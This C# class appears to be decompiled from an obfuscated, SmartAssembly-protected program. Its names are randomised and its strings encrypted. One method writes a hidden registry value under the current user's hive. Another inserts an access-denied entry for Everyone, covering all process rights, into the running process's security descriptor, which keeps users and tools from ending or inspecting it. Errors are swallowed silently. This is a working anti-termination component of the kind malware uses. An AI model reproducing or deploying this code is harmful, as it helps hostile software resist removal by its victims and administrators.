using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eMvPcEiNWKRwo;

internal sealed class FkTsTousMceh
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr rskeMPARyQc, int lvVWOLPxpoAAUQ, [Out] byte[] lwagMcGMcqnn, uint wYSaxWyydDvkt, out uint QOmSLcMrDwcY);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr QJCfrHGmOxV, int paNEYTyhhveK, [In] byte[] wXLNNMFQuIyqo);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void KsVXTtOkLvRgeRE(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(NXVLxNyJvZLW.tzJESwPzibp(getString_0(107408997)));
			registryKey.SetValue(NXVLxNyJvZLW.tzJESwPzibp(getString_0(107408860)), getString_0(107410014));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor xlmaVDMWhyqpu(IntPtr intptr_0)
	{
		byte[] lwagMcGMcqnn = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, lwagMcGMcqnn, 0u, out var QOmSLcMrDwcY);
		if ((long)QOmSLcMrDwcY > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, lwagMcGMcqnn = new byte[QOmSLcMrDwcY], QOmSLcMrDwcY, out QOmSLcMrDwcY))
		{
			return null;
		}
		return new RawSecurityDescriptor(lwagMcGMcqnn, 0);
	}

	private void DYfZZtrIdWamR(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void xOEsXJRLbcApzr()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = xlmaVDMWhyqpu(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			DYfZZtrIdWamR(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static FkTsTousMceh()
	{
		Strings.CreateGetStringDelegate(typeof(FkTsTousMceh));
	}
}
